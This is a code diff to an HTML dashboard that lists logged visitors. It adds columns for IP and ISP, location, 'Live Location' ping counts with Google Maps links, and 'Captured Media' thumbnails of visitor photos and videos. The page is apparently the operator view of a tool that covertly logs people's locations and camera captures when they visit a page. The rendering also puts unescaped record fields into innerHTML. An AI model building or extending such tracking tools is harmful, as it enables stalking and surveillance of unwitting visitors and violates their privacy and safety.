@@ -75,6 +75,34 @@
             text-align: center;
             color: #5bd98b;
         }
+
+        .thumbnail {
+            width: 50px;
+            height: 50px;
+            object-fit: cover;
+            border: 1px solid #2bff8a;
+            border-radius: 4px;
+            margin: 2px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            vertical-align: middle;
+        }
+        .thumbnail:hover {
+            transform: scale(3.5);
+            position: relative;
+            z-index: 10;
+            box-shadow: 0 0 10px rgba(43, 255, 138, 0.8);
+        }
+        .map-link {
+            color: #2bff8a;
+            text-decoration: none;
+            font-weight: bold;
+            border-bottom: 1px dashed #2bff8a;
+        }
+        .map-link:hover {
+            color: #8bffbb;
+            border-bottom-style: solid;
+        }
     </style>
 </head>
 
@@ -92,12 +120,10 @@
                 <thead>
                     <tr>
                         <th>Time</th>
-                        <th>IP</th>
-                        <th>City</th>
-                        <th>Region</th>
-                        <th>Country</th>
-                        <th>Coordinates</th>
-                        <th>ISP</th>
+                        <th>IP / ISP</th>
+                        <th>Location</th>
+                        <th>Live Location</th>
+                        <th>Captured Media</th>
                     </tr>
                 </thead>
                 <tbody id="rows"></tbody>
@@ -112,21 +138,51 @@
             const records = raw ? JSON.parse(raw) : [];
 
             if (!records.length) {
-                rowsEl.innerHTML = '<tr><td colspan="7" class="empty">No visitor data yet.</td></tr>';
+                rowsEl.innerHTML = '<tr><td colspan="5" class="empty">No visitor data yet.</td></tr>';
                 return;
             }
 
-            rowsEl.innerHTML = records.map(item => `
-                <tr>
-                    <td>${new Date(item.timestamp).toLocaleString()}</td>
-                    <td>${item.ip || 'N/A'}</td>
-                    <td>${item.city || 'N/A'}</td>
-                    <td>${item.region || 'N/A'}</td>
-                    <td>${item.country || 'N/A'}</td>
-                    <td>${item.lat && item.lon ? `${item.lat}, ${item.lon}` : 'N/A'}</td>
-                    <td>${item.org || 'N/A'}</td>
-                </tr>
-            `).join('');
+            rowsEl.innerHTML = records.map(item => {
+                // IP & ISP
+                const ipStr = `<div>${item.ip || 'N/A'}</div><div style="font-size: 11px; color: #5bd98b;">${item.org || ''}</div>`;
+                
+                // Location Details (City, Region, Country)
+                const locationParts = [item.city, item.region, item.country].filter(Boolean);
+                const locationStr = locationParts.length > 0 ? locationParts.join(', ') : 'N/A';
+                
+                // Coordinates & Live Tracker
+                let coordStr = 'N/A';
+                if (item.lat && item.lon) {
+                    const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${item.lat},${item.lon}`;
+                    coordStr = `<div><a href="${mapsUrl}" target="_blank" class="map-link">${item.lat.toFixed(4)}, ${item.lon.toFixed(4)}</a></div>`;
+                    if (item.locationHistory && item.locationHistory.length > 1) {
+                        coordStr += `<div style="font-size:11px; color:#5bd98b; margin-top:2px;">(Live: ${item.locationHistory.length} pings)</div>`;
+                    }
+                }
+                
+                // Media (photos/videos)
+                let mediaHtml = 'N/A';
+                if (item.media && item.media.length > 0) {
+                    mediaHtml = item.media.map(m => {
+                        if (m.type === 'photo') {
+                            return `<img src="${m.data}" class="thumbnail" alt="Visitor photo" />`;
+                        } else if (m.type === 'video') {
+                            return `<video src="${m.data}" class="thumbnail" muted loop onmouseover="this.play()" onmouseout="this.pause()"></video>`;
+                        }
+                        return '';
+                    }).join('');
+                }
+                
+                return `
+                    <tr>
+                        <td style="white-space: nowrap;">${new Date(item.timestamp).toLocaleString()}</td>
+                        <td>${ipStr}</td>
+                        <td>${locationStr}</td>
+                        <td>${coordStr}</td>
+                        <td>${mediaHtml}</td>
+                    </tr>
+                `;
+            }).join('');
         }
 
         // Initial load and poll for updates so dashboard reflects new localStorage entries
